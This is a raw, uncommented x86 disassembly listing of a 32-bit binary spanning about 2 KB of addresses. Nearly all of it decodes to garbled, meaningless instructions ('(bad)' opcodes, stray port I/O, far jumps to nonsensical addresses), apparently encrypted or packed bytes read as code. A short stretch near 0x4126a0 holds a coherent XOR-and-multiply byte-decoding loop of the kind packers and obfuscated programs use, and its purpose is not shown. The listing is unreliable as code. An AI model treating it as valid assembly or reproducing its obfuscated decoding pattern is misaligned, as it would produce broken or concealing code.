  4125a8:	add    al,0x9f
  4125aa:	ins    BYTE PTR es:[edi],dx
  4125ab:	rcl    ebx,1
  4125ad:	in     eax,dx
  4125ae:	pop    ebp
  4125af:	into   
  4125b0:	test   DWORD PTR [edx],esi
  4125b2:	add    DWORD PTR [edi-0x711cc2ed],esp
  4125b8:	mov    edx,0x6105f09
  4125be:	mov    eax,ds:0xcd9eb201
  4125c3:	and    al,0x42
  4125c5:	or     bl,bh
  4125c7:	test   al,0x43
  4125c9:	scas   al,BYTE PTR es:[edi]
  4125ca:	dec    ecx
  4125cb:	js     0x4125e3
  4125cd:	(bad)  
  4125ce:	adc    dl,cl
  4125d0:	cwde   
  4125d1:	sub    cl,BYTE PTR [esi]
  4125d3:	repz and edi,DWORD PTR [ebx+0x21c6238b]
  4125da:	cmp    DWORD PTR [edi-0xf],edx
  4125dd:	dec    eax
  4125de:	mov    bh,0x99
  4125e0:	dec    ebx
  4125e1:	cwde   
  4125e2:	iret   
  4125e3:	in     eax,0xaf
  4125e5:	pushf  
  4125e6:	pop    ss
  4125e7:	data16 fist DWORD PTR [edi-0x36ca158c]
  4125ee:	(bad)  
  4125ef:	idiv   DWORD PTR [edi-0x2a]
  4125f2:	int    0xb8
  4125f4:	jmp    0x412594
  4125f6:	push   esi
  4125f7:	jnp    0x412655
  4125f9:	ret    0xf809
  4125fc:	repz and ch,dh
  4125ff:	cmp    edx,ecx
  412601:	jg     0x412662
  412603:	cs sahf 
  412605:	ret    0xb67d
  412608:	inc    ecx
  412609:	add    DWORD PTR [ebx+0x47],ebx
  41260c:	gs out 0x23,al
  41260f:	cmp    eax,0x7ca3e9c7
  412614:	ret    
  412615:	xchg   edx,eax
  412616:	aam    0x8c
  412618:	in     al,dx
  412619:	add    DWORD PTR [ebx-0x34],0xb66854dc
  412620:	xchg   ebp,eax
  412621:	in     eax,0x53
  412623:	scas   eax,DWORD PTR es:[edi]
  412624:	cmp    dl,bh
  412626:	mov    edi,0xa068f74d
  41262b:	adc    eax,0x6d8db230
  412630:	mov    ebp,0xa1a51bfe
  412635:	aas    
  412636:	and    bh,bl
  412638:	and    esp,DWORD PTR [ecx-0x6721691]
  41263e:	ret    0x398f
  412641:	cdq    
  412642:	adc    edx,DWORD PTR [ecx+0x180a64ef]
  412648:	fnsave [eax-0x50b11004]
  41264e:	mov    dl,BYTE PTR [ebx+0x78fd8b16]
  412654:	stos   DWORD PTR es:[edi],eax
  412655:	imul   ecx,DWORD PTR [edi+0x13],0x772a429c
  41265c:	add    ebx,ebp
  41265e:	bound  eax,QWORD PTR [ebx]
  412660:	inc    esi
  412661:	mov    eax,0x4bf96aaf
  412666:	das    
  412667:	adc    ebp,esp
  412669:	out    dx,eax
  41266a:	fidivr WORD PTR [ebx]
  41266c:	mov    edi,0x8ec3d01f
  412671:	scas   al,BYTE PTR es:[edi]
  412672:	fs add dl,bl
  412675:	and    ebx,DWORD PTR [edi]
  412677:	mov    ds:0x9bfa1d68,al
  41267c:	loop   0x412604
  41267e:	dec    ecx
  41267f:	cmp    ecx,DWORD PTR ds:0x7332ae3e
  412685:	xor    DWORD PTR [ebp+esi*8-0x7e287dad],0xd6e6aa8e
  412690:	lods   al,BYTE PTR ds:[esi]
  412691:	jl     0x4126a7
  412693:	cli    
  412694:	(bad)  
  412695:	sbb    ecx,ebx
  412697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412698:	rcl    esi,cl
  41269a:	mov    edx,edi
  41269c:	jne    0x4126b8
  4126a2:	xor    eax,esi
  4126a4:	add    eax,edi
  4126a6:	imul   eax,edx
  4126a9:	mov    edx,DWORD PTR [ebp-0x8]
  4126ac:	movzx  eax,BYTE PTR [eax+edx*1]
  4126b0:	mov    edx,DWORD PTR [ebp-0x48]
  4126b3:	jmp    0x4126c9
  4126b8:	xor    eax,esi
  4126ba:	add    eax,edi
  4126bc:	imul   eax,edx
  4126bf:	mov    edx,DWORD PTR [ebp-0x8]
  4126c2:	movzx  eax,BYTE PTR [eax+edx*1]
  4126c6:	mov    edx,DWORD PTR [ebp-0x4c]
  4126c9:	xor    edx,esi
  4126cb:	lea    eax,[edx+eax*1+0x3272db]
  4126d2:	movzx  edx,BYTE PTR [ebp-0x1]
  4126d6:	xor    edx,eax
  4126d8:	mov    BYTE PTR [ebp-0x1],dl
  4126db:	mov    al,BYTE PTR [ebp-0x1]
  4126de:	mov    edx,DWORD PTR [ebp-0x30]
  4126e1:	mov    ebx,DWORD PTR [ebp-0xc]
  4126e4:	xor    edx,esi
  4126e6:	add    edx,edi
  4126e8:	imul   edx,ebx
  4126eb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4126ee:	xor    ebx,esi
  4126f0:	add    edx,ebx
  4126f2:	mov    ebx,DWORD PTR [ebp-0x8]
  4126f5:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  4126fc:	mov    eax,DWORD PTR [ebp-0x38]
  4126ff:	jmp    0x414a74
  412704:	sbb    ch,BYTE PTR [edx+0xa]
  412707:	sbb    eax,0x65e59d8a
  41270c:	push   eax
  41270d:	mov    ah,0x55
  41270f:	mov    al,0xca
  412711:	mov    edx,0x6a475723
  412716:	bound  esp,QWORD PTR [edx+0xa]
  412719:	pop    edi
  41271a:	bound  esp,QWORD PTR [edx-0x7f]
  41271d:	jle    0x4126d2
  41271f:	or     edx,edi
  412721:	pop    eax
  412722:	int    0x9f
  412724:	sbb    bh,BYTE PTR [eax+0x3c545ac1]
  41272a:	call   0xe46:0xba5328e8
  412731:	test   eax,0x3bd83976
  412736:	mov    cl,0x4c
  412738:	cmp    al,bh
  41273a:	jl     0x4127ba
  41273c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41273d:	mov    ecx,0x3af9a977
  412742:	mov    edi,DWORD PTR [edx+0x47]
  412745:	fistp  WORD PTR [ebp+0x5db4635e]
  41274b:	sub    bl,BYTE PTR [ecx-0x20f94045]
  412751:	push   ds
  412752:	push   0xffffff9f
  412754:	sub    BYTE PTR [edx+0x12],bh
  412757:	mov    esi,es
  412759:	in     al,0x13
  41275b:	loope  0x4126fb
  41275d:	ins    BYTE PTR es:[edi],dx
  41275e:	mov    eax,ds:0xaf78d73c
  412763:	cmp    BYTE PTR [edi],cl
  412765:	sbb    ah,dl
  412767:	push   0xffffffd2
  412769:	daa    
  41276a:	popf   
  41276b:	dec    ecx
  41276c:	mov    bl,0x5c
  41276e:	cmp    al,0x1e
  412770:	cmp    eax,0x716cddee
  412775:	xor    DWORD PTR [ebx+0x47],ecx
  412778:	adc    al,0x74
  41277a:	push   eax
  41277b:	stc    
  41277c:	push   ss
  41277d:	mov    ecx,0x5e2f759
  412782:	or     dh,al
  412784:	sbb    DWORD PTR [edx+0x24],edx
  412787:	xor    BYTE PTR [ebx],bl
  412789:	dec    esi
  41278a:	jno    0x412765
  41278c:	jmp    0x9af057c8
  412791:	cli    
  412792:	mov    ch,0x30
  412794:	pop    ebp
  412795:	inc    ebp
  412796:	cmp    eax,ebp
  412798:	into   
  412799:	aaa    
  41279a:	cmp    DWORD PTR ds:0xb8085edb,esi
  4127a0:	addr16 dec edx
  4127a2:	push   ds
  4127a3:	test   BYTE PTR [eax],0xc7
  4127a6:	out    dx,eax
  4127a7:	or     eax,0x2a326c45
  4127ac:	add    ecx,DWORD PTR [eax+0x25]
  4127af:	clc    
  4127b0:	cld    
  4127b1:	fs jns 0x412784
  4127b4:	mov    esp,0x30f527ce
  4127b9:	outs   dx,BYTE PTR ds:[esi]
  4127ba:	adc    dl,ch
  4127bc:	rcr    BYTE PTR [ecx-0x17],1
  4127bf:	lea    ebx,[ebx-0x71]
  4127c2:	loopne 0x4127fc
  4127c4:	lock in al,dx
  4127c6:	inc    ecx
  4127c7:	jne    0x41277c
  4127c9:	pushf  
  4127ca:	mov    esi,0x836c1ce0
  4127cf:	xchg   edx,eax
  4127d0:	mov    eax,ds:0x9f5e0d3b
  4127d5:	sar    DWORD PTR [edx+0x75],0xcc
  4127d9:	and    BYTE PTR [ebx+ebp*4+0x4c7e2383],0xf3
  4127e1:	stc    
  4127e2:	and    BYTE PTR [edi-0x75d0676f],ah
  4127e8:	dec    ebp
  4127e9:	add    ah,BYTE PTR [ebp-0x7ffe8b8a]
  4127ef:	inc    esi
  4127f0:	mov    ebx,0xb83e2f0f
  4127f5:	inc    ebp
  4127f6:	rol    BYTE PTR [esi-0x32],1
  4127f9:	ret    
  4127fa:	(bad)  
  4127fb:	loopne 0x412827
  4127fd:	mov    ds:0x63d16833,al
  412802:	lods   eax,DWORD PTR ds:[esi]
  412803:	mov    fs,ecx
  412805:	and    al,BYTE PTR [ebp-0x78f896da]
  41280b:	stos   BYTE PTR es:[edi],al
  41280c:	rcr    bl,1
  41280e:	adc    bh,BYTE PTR [ecx-0x629ef579]
  412814:	(bad)  
  412815:	(bad)  
  412816:	mov    ds:0x734dc06a,eax
  41281b:	xchg   ebp,eax
  41281c:	not    BYTE PTR [ebx+0x79]
  41281f:	adc    DWORD PTR [ebx+0x53b44a53],eax
  412825:	add    al,0x7c
  412827:	inc    eax
  412828:	mov    al,0x74
  41282a:	jg     0x4127db
  41282c:	push   edi
  41282d:	sub    BYTE PTR ds:0xa16bef40,dl
  412833:	inc    edi
  412834:	(bad)  
  412836:	or     esi,DWORD PTR [esi-0x30]
  412839:	inc    ebx
  41283a:	sub    al,BYTE PTR [esi+eiz*2-0xfb6b736]
  412841:	add    eax,0xb8d97805
  412846:	std    
  412847:	popf   
  412848:	xlat   BYTE PTR ds:[ebx]
  412849:	adc    al,0x1b
  41284b:	fucompp 
  41284d:	stos   BYTE PTR es:[edi],al
  41284e:	jge    0x412875
  412850:	data16 fidiv DWORD PTR ss:[esi]
  412854:	adc    al,0x2e
  412856:	sti    
  412857:	retf   0x6133
  41285a:	enter  0xe17b,0x13
  41285e:	jne    0x41286f
  412860:	xchg   edi,eax
  412861:	push   ds
  412862:	inc    esp
  412863:	retf   
  412864:	xchg   BYTE PTR [ecx+0x4],bl
  412867:	inc    ebx
  412868:	test   BYTE PTR [eax-0x13ae3b37],ch
  41286e:	sbb    eax,0x4f4c1fd1
  412873:	or     DWORD PTR [eax+ebx*2-0x4a],ebp
  412877:	sbb    dl,ch
  412879:	mov    esi,0x7b241c7c
  41287e:	jp     0x412890
  412880:	(bad)  
  412881:	adc    BYTE PTR [ecx],al
  412883:	sub    BYTE PTR [edi+0x2c2ff1ad],0x7e
  41288a:	sti    
  41288b:	xlat   BYTE PTR ds:[ebx]
  41288c:	ins    BYTE PTR es:[edi],dx
  41288d:	aam    0x5a
  41288f:	out    dx,eax
  412890:	into   
  412891:	inc    ecx
  412892:	pop    esp
  412893:	xchg   ebx,eax
  412894:	mov    ecx,0x9d36041b
  412899:	les    ecx,FWORD PTR [edx+0x4b900f7f]
  41289f:	or     edx,ecx
  4128a1:	add    al,0xc0
  4128a3:	js     0x4128c3
  4128a5:	out    0x5d,eax
  4128a7:	mov    esi,0x431ae4bc
  4128ac:	cwde   
  4128ad:	test   BYTE PTR [edx-0x54e74763],cl
  4128b3:	sbb    eax,0x628f338f
  4128b8:	mov    cl,0x8a
  4128ba:	fld    TBYTE PTR [eax+0x14]
  4128bd:	fidiv  WORD PTR [edx]
  4128bf:	repz jnp 0x412885
  4128c2:	jmp    0x412888
  4128c4:	mov    dh,0xc0
  4128c6:	les    edx,FWORD PTR [ebx]
  4128c8:	mov    dl,0x61
  4128ca:	rcr    DWORD PTR [edx+edx*8],cl
  4128cd:	jne    0x412857
  4128cf:	pop    ds
  4128d0:	sbb    DWORD PTR [ebp+ebp*8-0x67b089ae],ebp
  4128d7:	adc    BYTE PTR [edi-0x48],ah
  4128da:	jno    0x41286f
  4128dc:	sub    al,al
  4128de:	xchg   edx,eax
  4128df:	adc    eax,0x61ec3fee
  4128e4:	cmp    al,0xca
  4128e6:	push   0xfffffff0
  4128e8:	jne    0x41292b
  4128ea:	sar    bl,0x86
  4128ed:	fs enter 0xbb72,0xc0
  4128f2:	adc    al,0xba
  4128f4:	rcr    ebp,1
  4128f6:	or     al,0x8d
  4128f8:	or     al,0x44
  4128fa:	ins    DWORD PTR es:[edi],dx
  4128fb:	arpl   WORD PTR [esi-0x61],cx
  4128fe:	jo     0x412892
  412900:	xor    DWORD PTR [edx-0x366d8ce0],0xffffffc6
  412907:	inc    ebx
  412908:	lea    esi,[esi+0x40]
  41290b:	pop    es
  41290c:	mov    esi,0x7c1a364e
  412911:	lahf   
  412912:	enter  0xdd74,0x0
  412916:	mov    ebp,DWORD PTR [edx-0x39adffd1]
  41291c:	add    cl,0xac
  41291f:	call   0xc872:0xde30e526
  412926:	stos   BYTE PTR es:[edi],al
  412927:	addr16 in eax,dx
  412929:	rcr    BYTE PTR [eax+0x4],1
  41292c:	cmp    eax,0x43ebfd1c
  412931:	xchg   ecx,eax
  412932:	or     DWORD PTR [ebx],esi
  412934:	push   esp
  412935:	imul   ebx,esp,0xffffffc0
  412938:	ja     0x41297e
  41293a:	lock sbb al,0xa5
  41293d:	es inc edx
  41293f:	ficomp DWORD PTR [edx]
  412941:	add    BYTE PTR [eax],bh
  412943:	test   eax,0x24b6cc81
  412948:	mov    ecx,0x6befc1e8
  41294d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41294e:	repz xor eax,0x5c1eabe2
  412954:	scas   eax,DWORD PTR es:[edi]
  412955:	add    DWORD PTR [ecx+0x4f15386b],ebp
  41295b:	jns    0x4128f6
  41295d:	adc    DWORD PTR [ecx],ebp
  41295f:	cli    
  412960:	push   esp
  412961:	xchg   esi,eax
  412962:	inc    ebx
  412963:	fadd   QWORD PTR [ebx+edx*1]
  412966:	pop    ebp
  412967:	mov    cs,WORD PTR [edi+esi*2]
  41296a:	mov    esi,0x5c7ac261
  41296f:	sbb    esp,DWORD PTR [ebx]
  412971:	loop   0x412929
  412973:	test   DWORD PTR [edi+0x16],esi
  412976:	cmp    eax,DWORD PTR [ebx-0x234e6761]
  41297c:	sub    eax,0xe4677c3f
  412981:	mov    esi,es
  412983:	sub    edi,ecx
  412985:	adc    al,0x9f
  412987:	lods   eax,DWORD PTR ds:[esi]
  412988:	loop   0x41291c
  41298a:	int    0xef
  41298c:	cmp    DWORD PTR [ebx+eax*1+0x1f],ecx
  412990:	sub    ecx,DWORD PTR [edi]
  412992:	fs sub al,0xc9
  412995:	xchg   esi,eax
  412996:	test   eax,0x7f0bafd4
  41299b:	mov    dh,0x92
  41299d:	sub    al,0x78
  41299f:	sbb    DWORD PTR [edx+0x5f],0xffffffca
  4129a3:	inc    edx
  4129a4:	push   ds
  4129a5:	inc    edi
  4129a6:	into   
  4129a7:	sbb    al,0x2e
  4129a9:	(bad)  
  4129aa:	imul   edx,DWORD PTR [edx],0xbb1697a1
  4129b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129b1:	(bad)  
  4129b2:	jnp    0x4129c1
  4129b4:	or     BYTE PTR [ecx+0x58],0x48
  4129b8:	xchg   edi,eax
  4129b9:	fst    DWORD PTR [eax+edi*4+0x3804bfcc]
  4129c0:	cmp    al,0xe4
  4129c2:	cld    
  4129c3:	jecxz  0x4129f5
  4129c5:	mov    dh,0xa
  4129c7:	and    al,0x1a
  4129c9:	ss push es
  4129cb:	daa    
  4129cc:	jno    0x412962
  4129ce:	ins    DWORD PTR es:[edi],dx
  4129cf:	dec    edx
  4129d1:	push   edi
  4129d2:	mov    ecx,0x4b8218f0
  4129d7:	xor    dl,BYTE PTR [ebp+0x3e]
  4129da:	xchg   esi,eax
  4129db:	(bad)  
  4129dc:	cs scas al,BYTE PTR es:[edi]
  4129de:	and    DWORD PTR [eax-0x3d],edi
  4129e1:	ins    BYTE PTR es:[edi],dx
  4129e2:	mov    ebx,0xefe477c1
  4129e7:	or     BYTE PTR [ebx+0x70],ah
  4129ea:	test   DWORD PTR [ecx],esi
  4129ec:	jo     0x4129e6
  4129ee:	jno    0x412a3d
  4129f0:	pushf  
  4129f1:	popf   
  4129f2:	add    cl,ah
  4129f4:	pop    es
  4129f5:	call   0x6c0d:0xf579a035
  4129fc:	jmp    0xaa1f:0x461249cc
  412a03:	shl    BYTE PTR [ebp-0x32853979],1
  412a09:	je     0x4129d2
  412a0b:	mov    eax,0x8afb40c4
  412a10:	repz push 0x8bf0f42
  412a16:	out    0x3d,eax
  412a18:	fldenv [ebx+0x713fa58c]
  412a1e:	mov    ah,0xdf
  412a20:	dec    esp
  412a21:	ins    DWORD PTR es:[edi],dx
  412a22:	mov    bh,0x48
  412a24:	jae    0x4129f8
  412a26:	and    BYTE PTR [edi-0x3e],ah
  412a29:	retf   0x494e
  412a2c:	nop
  412a2d:	fdivr  DWORD PTR [edx-0x2]
  412a30:	lods   eax,DWORD PTR ds:[esi]
  412a31:	daa    
  412a32:	(bad)  
  412a33:	fistp  DWORD PTR [ecx]
  412a35:	mul    BYTE PTR [eax+ebx*2]
  412a38:	inc    ebp
  412a39:	xor    ecx,DWORD PTR [edx]
  412a3b:	cmp    DWORD PTR [ebx+ebx*8+0x228edc62],ebp
  412a42:	outs   dx,BYTE PTR ds:[esi]
  412a43:	aas    
  412a44:	stos   BYTE PTR es:[edi],al
  412a45:	out    dx,al
  412a46:	pop    edx
  412a47:	das    
  412a48:	push   0x54ea757
  412a4d:	xchg   ebp,eax
  412a4e:	jbe    0x412a1f
  412a50:	sub    eax,esp
  412a52:	cld    
  412a53:	pop    ebp
  412a54:	gs (bad) 
  412a58:	lods   eax,DWORD PTR ds:[esi]
  412a59:	pop    esp
  412a5a:	adc    BYTE PTR [ebx-0x40e74e7a],cl
  412a60:	dec    eax
  412a61:	push   eax
  412a62:	xlat   BYTE PTR ds:[ebx]
  412a63:	xchg   esp,eax
  412a64:	out    dx,eax
  412a65:	cmp    dh,cl
  412a67:	xor    eax,0x2ca24f5
  412a6c:	das    
  412a6d:	ss pop ebx
  412a6f:	jmp    0xe86d582d
  412a74:	and    cl,ch
  412a76:	inc    edx
  412a77:	aas    
  412a78:	imul   BYTE PTR [ebx-0x19]
  412a7b:	sub    BYTE PTR [ebx+0x26],0x59
  412a7f:	and    esi,DWORD PTR [ebx+edi*1]
  412a82:	inc    dh
  412a84:	mov    al,ds:0x57f58d72
  412a89:	push   edx
  412a8a:	cmp    ecx,DWORD PTR [ebp+0x52ab2f54]
  412a90:	scas   al,BYTE PTR es:[edi]
  412a91:	dec    esp
  412a92:	icebp  
  412a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a94:	lahf   
  412a95:	xor    edi,ebx
  412a97:	add    DWORD PTR [ecx-0x66],eax
  412a9a:	add    esp,ebp
  412a9c:	dec    ecx
  412a9d:	(bad)  
  412a9e:	not    DWORD PTR [eax]
  412aa0:	pop    eax
  412aa1:	xor    ebx,DWORD PTR [ecx]
  412aa3:	mov    ch,0xbe
  412aa5:	fdiv   st(1),st
  412aa7:	jnp    0x412aee
  412aa9:	cld    
  412aaa:	int    0x66
  412aac:	aas    
  412aad:	ins    BYTE PTR es:[edi],dx
  412aae:	push   eax
  412aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ab0:	mov    dl,0x6f
  412ab2:	mov    eax,0x1465a92e
  412ab7:	fld    TBYTE PTR [eax]
  412ab9:	cmp    edx,DWORD PTR [edx-0x21f4de9f]
  412abf:	mov    eax,DWORD PTR [esp+esi*8-0x7a]
  412ac3:	sbb    al,BYTE PTR [ebx]
  412ac5:	push   eax
  412ac6:	js     0x412a62
  412ac8:	call   0x17c3:0x83d7bd9a
  412acf:	mov    dl,0x2c
  412ad1:	(bad)  
  412ad3:	fadd   st(0),st
  412ad5:	mov    ch,0xdf
  412ad7:	push   ds
  412ad8:	mov    ch,0x76
  412ada:	fidiv  DWORD PTR [ebp+0x18c878b0]
  412ae0:	ret    0x6353
  412ae3:	mov    eax,ds:0x56c6b3f4
  412ae8:	push   ds
  412ae9:	test   dl,0x40
  412aec:	adc    DWORD PTR [eax+0xda4fa1a],0xb97bae59
  412af6:	scas   eax,DWORD PTR es:[edi]
  412af7:	inc    ebx
  412af8:	mov    dl,0x9f
  412afa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412afb:	add    esp,DWORD PTR [esi]
  412afd:	inc    eax
  412afe:	(bad)  
  412b00:	shl    BYTE PTR ds:0x3f9dd15e,cl
  412b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b07:	lock sbb eax,0xd7d3a761
  412b0d:	out    0x16,eax
  412b0f:	adc    al,0x7d
  412b11:	(bad)  
  412b12:	pusha  
  412b13:	cmp    esi,ecx
  412b15:	cmp    BYTE PTR [esi],ch
  412b17:	loop   0x412af2
  412b19:	push   ebx
  412b1a:	jecxz  0x412b13
  412b1c:	lods   eax,DWORD PTR ds:[esi]
  412b1d:	shl    BYTE PTR [edi],0x97
  412b20:	mov    ecx,0xce584101
  412b25:	mov    ebp,0xcbf62751
  412b2a:	mov    dl,ch
  412b2c:	dec    ebp
  412b2d:	dec    eax
  412b2e:	add    BYTE PTR [edx],0xa7
  412b31:	mov    ch,0x5b
  412b33:	xor    DWORD PTR [edx+edx*1],esp
  412b36:	outs   dx,BYTE PTR ds:[esi]
  412b37:	xor    ebp,eax
  412b39:	dec    esp
  412b3a:	jb     0x412bb2
  412b3c:	push   eax
  412b3d:	dec    esi
  412b3e:	jbe    0x412b34
  412b40:	push   edi
  412b41:	xor    ebp,DWORD PTR [ebp+0x1]
  412b44:	pop    ds
  412b45:	adc    al,0xa6
  412b47:	ja     0x412b9c
  412b49:	jo     0x412afa
  412b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b4c:	clc    
  412b4d:	jge    0x412b6f
  412b4f:	or     eax,0x23bc829f
  412b54:	stc    
  412b55:	and    BYTE PTR [edi],dh
  412b57:	inc    ebx
  412b58:	dec    ebx
  412b59:	shl    BYTE PTR [edx],cl
  412b5b:	xchg   ebp,eax
  412b5c:	daa    
  412b5d:	jns    0x412b70
  412b5f:	mov    eax,0x2c5c9a83
  412b64:	(bad)  
  412b66:	add    eax,0xaf5e4261
  412b6b:	cwde   
  412b6c:	xchg   ecx,eax
  412b6d:	fcom   QWORD PTR [ecx]
  412b6f:	out    dx,eax
  412b70:	cli    
  412b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b72:	xchg   ebx,eax
  412b73:	mov    eax,ds:0x47896498
  412b78:	sub    al,0x9f
  412b7a:	push   ss
  412b7b:	push   esp
  412b7c:	cli    
  412b7d:	lahf   
  412b7e:	inc    esp
  412b7f:	jge    0x412b9e
  412b81:	mov    ds:0x63767a81,al
  412b86:	fs and eax,0xfb1ae9bb
  412b8d:	fld    DWORD PTR [esi]
  412b8f:	adc    esp,DWORD PTR [edx-0x16]
  412b92:	mov    dl,0x20
  412b94:	stos   DWORD PTR es:[edi],eax
  412b95:	xor    ebx,DWORD PTR [edx]
  412b97:	lods   eax,DWORD PTR ds:[esi]
  412b98:	xor    BYTE PTR [eax],ch
  412b9a:	xchg   edx,eax
  412b9b:	in     al,dx
  412b9c:	ds cld 
  412b9e:	cmp    eax,esp
  412ba0:	dec    ebx
  412ba1:	inc    ecx
  412ba2:	stos   DWORD PTR es:[edi],eax
  412ba3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba4:	ret    0x73a4
  412ba7:	mov    al,ds:0xbc53c83f
  412bac:	pop    ecx
  412bad:	nop
  412bae:	inc    ebp
  412baf:	inc    eax
  412bb0:	dec    ebp
  412bb1:	and    BYTE PTR [eax+0x3c],ch
  412bb4:	mov    ebp,0xbc22376f
  412bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bba:	pop    ds
  412bbb:	mov    BYTE PTR [ebp+0x76],ah
  412bbe:	enter  0x2faa,0xed
  412bc2:	xchg   ecx,eax
  412bc3:	cmp    eax,0x390553c7
  412bc8:	int    0x78
  412bca:	bound  eax,QWORD PTR [ebx]
  412bcc:	add    ecx,DWORD PTR [edx+0x67]
  412bcf:	jmp    0xe4d58667
  412bd4:	adc    bl,bh
  412bd6:	(bad)  
  412bd7:	adc    eax,0x8d82c5e
  412bdc:	xor    DWORD PTR ds:0xb9ecd14e,esi
  412be2:	push   edi
  412be3:	out    dx,al
  412be4:	sbb    BYTE PTR [edx],bl
  412be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412be8:	repnz std 
  412bea:	mov    bh,0x77
  412bec:	test   BYTE PTR [eax],cl
  412bee:	enter  0x50bb,0xa5
  412bf2:	test   BYTE PTR [edi-0x4a],bl
  412bf5:	inc    esi
  412bf6:	jnp    0x412bc3
  412bf8:	or     DWORD PTR [edx+esi*4],esi
  412bfb:	jnp    0x412be1
  412bfd:	mov    ch,0xbe
  412bff:	pop    ebx
  412c00:	sbb    al,0xf
  412c02:	mov    eax,0x22b267e8
  412c07:	add    edx,DWORD PTR [eax+0x53c6b88e]
  412c0d:	add    al,0x7e
  412c0f:	sbb    bl,BYTE PTR [ebx]
  412c11:	icebp  
  412c12:	xchg   eax,edi
  412c14:	retf   0x32a1
  412c17:	stos   BYTE PTR es:[edi],al
  412c18:	or     BYTE PTR es:[ecx+0x44],bl
  412c1c:	or     DWORD PTR [ebp+0x4],edi
  412c1f:	push   ecx
  412c20:	inc    esp
  412c21:	adc    ah,BYTE PTR [ebx]
  412c23:	aas    
  412c24:	or     al,0xf2
  412c26:	dec    ecx
  412c27:	and    BYTE PTR [edx+0x474edb4a],al
  412c2d:	pop    ebx
  412c2e:	cld    
  412c2f:	in     al,dx
  412c30:	mov    ebx,0xe250c4da
  412c35:	mov    edi,0xaf217214
  412c3a:	outs   dx,DWORD PTR ds:[esi]
  412c3b:	loopne 0x412bbd
  412c3d:	sub    bh,BYTE PTR [ebx+0x1b]
  412c40:	in     al,0x61
  412c42:	mov    ebp,0x4430d739
  412c47:	and    edx,DWORD PTR [ebp-0x3f]
  412c4a:	jno    0x412c47
  412c4c:	inc    eax
  412c4d:	cdq    
  412c4e:	push   ds
  412c4f:	and    al,0x7d
  412c51:	mov    ebx,0x1890e06b
  412c56:	inc    esp
  412c57:	arpl   WORD PTR [ebx+0x5e6aea13],ax
  412c5d:	mov    ds:0xaa96a79f,eax
  412c62:	lock pop edx
  412c64:	inc    ebx
  412c65:	std    
  412c66:	add    al,bl
  412c68:	loop   0x412c0c
  412c6a:	jle    0x412c6a
  412c6c:	retf   0x9b6
  412c6f:	mov    cs,WORD PTR [ecx+0x79]
  412c72:	and    eax,0xad3109fa
  412c77:	test   al,0xe9
  412c79:	pop    esi
  412c7a:	cdq    
  412c7b:	ins    DWORD PTR es:[edi],dx
  412c7c:	(bad)  
  412c7d:	sub    ebx,edx
  412c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c80:	xlat   BYTE PTR ds:[ebx]
  412c81:	xor    edx,edx
  412c83:	xor    al,0xcb
  412c85:	int3   
  412c86:	xchg   DWORD PTR [ebx],edx
  412c88:	jb     0x412c6f
  412c8a:	pop    ebx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	cmp    edx,esi
  412c8e:	mov    BYTE PTR [ecx-0x639bec78],0x34
  412c95:	or     al,0xf7
  412c97:	adc    al,0x41
  412c99:	xchg   esp,eax
  412c9a:	retf   
  412c9b:	xrelease mov DWORD PTR [eax],eax
  412c9e:	push   es
  412c9f:	(bad)  
  412ca0:	jno    0x412d19
  412ca2:	in     al,0x52
  412ca4:	inc    ebp
  412ca5:	je     0x412d26
  412ca7:	jbe    0x412cd1
  412ca9:	jmp    0xf0fb:0xef07fb08
  412cb0:	mov    dh,0x81
  412cb2:	(bad)  
  412cb3:	dec    edi
  412cb4:	sbb    ch,BYTE PTR [edx]
  412cb6:	inc    esp
  412cb7:	push   0xffffffda
  412cb9:	ret    
  412cba:	jmp    0x412cb6
  412cbc:	push   esp
  412cbd:	push   0xffffff81
  412cbf:	outs   dx,DWORD PTR ds:[esi]
  412cc0:	in     al,0x2b
  412cc2:	lods   eax,DWORD PTR ds:[esi]
  412cc3:	call   0x52fc:0x441db9b6
  412cca:	pop    esp
  412ccb:	aaa    
  412ccc:	in     al,dx
  412ccd:	scas   al,BYTE PTR es:[edi]
  412cce:	adc    edi,DWORD PTR [esi+0x1b633fd3]
  412cd4:	enter  0xe9b,0x40
  412cd8:	fwait
  412cd9:	xor    cl,0x74
  412cdc:	(bad)  
  412cdd:	sbb    BYTE PTR [esi-0x14],al
  412ce0:	xor    al,0x9f
  412ce2:	outs   dx,BYTE PTR ds:[esi]
  412ce3:	test   DWORD PTR ds:0x1047accf,esi
  412ce9:	scas   eax,DWORD PTR es:[edi]
  412cea:	mov    bh,0x61
  412cec:	cmp    BYTE PTR [ebp+ecx*4+0x152dfe9d],ah
  412cf3:	mov    ds:0x36477f36,al
  412cf8:	jae    0x412ca5
  412cfa:	(bad)  
  412cfd:	pop    ebp
  412cfe:	daa    
  412cff:	xchg   esi,eax
  412d00:	jmp    0xa2fc:0xfe2c9cb8
  412d07:	in     al,0x75
  412d09:	mov    ds:0xbe6ca399,eax
  412d0e:	in     eax,0xe4
  412d10:	jle    0x412ca0
  412d12:	sbb    DWORD PTR [edx+esi*8-0x25],0xffffffeb
  412d17:	push   edx
  412d18:	xor    edi,DWORD PTR [ebp+0x12]
  412d1b:	sub    dl,BYTE PTR [esi-0x71527e75]
  412d21:	pop    ebx
  412d22:	shl    esi,1
  412d24:	dec    ebx
  412d25:	or     DWORD PTR [eax+ecx*1-0x77f0df12],0xfffffffc
  412d2d:	jecxz  0x412caf
  412d2f:	outs   dx,DWORD PTR ds:[esi]
